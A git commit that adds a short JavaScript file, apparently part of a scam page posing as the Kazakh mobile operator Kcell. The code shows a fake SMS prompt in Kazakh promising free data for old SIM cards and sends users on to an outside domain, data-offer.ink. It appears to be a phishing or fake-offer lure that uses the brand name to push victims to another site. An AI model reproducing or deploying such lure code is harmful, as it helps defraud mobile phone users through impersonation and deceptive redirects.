5085dfcc96702bc06311b482e08d0f08829eb757
katemj25 <mbokofficial1@gmail.com>
2025-06-03 18:02:34 -0700

    Create activate-kcelloffer.com.js

---
+++ activate-kcelloffer.com.js
@@ -0,0 +1,5 @@
+var password = 'Kcell тегін деректері'
+password=prompt('SMS: Құттықтаймыз Сіздің нөміріңіз 2G, 3G ЖӘНЕ 4G ескі SIM-карталар сыйлығын алуға құқылы, БЕЛСЕНДІРУ үшін OK түймесін басыңыз.. ','Kcell тегін деректері');
+if (password != 'Kcell тегін деректері') {
+location.href='https://data-offer.ink/activate-kcelloffer.com.html';
+}
